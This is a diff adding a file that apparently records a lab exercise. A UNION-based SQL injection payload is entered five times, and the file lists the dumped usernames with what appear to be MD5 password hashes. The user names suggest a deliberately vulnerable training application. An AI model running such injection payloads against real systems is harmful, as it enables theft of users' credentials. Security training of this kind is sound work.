@@ -1,0 +1,19 @@
+ID: a' UNION SELECT user AS first_name, password AS last_name FROM users; --
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+ID: a' UNION SELECT user AS first_name, password AS last_name FROM users; --
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+
+ID: a' UNION SELECT user AS first_name, password AS last_name FROM users; --
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+ID: a' UNION SELECT user AS first_name, password AS last_name FROM users; --
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+ID: a' UNION SELECT user AS first_name, password AS last_name FROM users; --
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
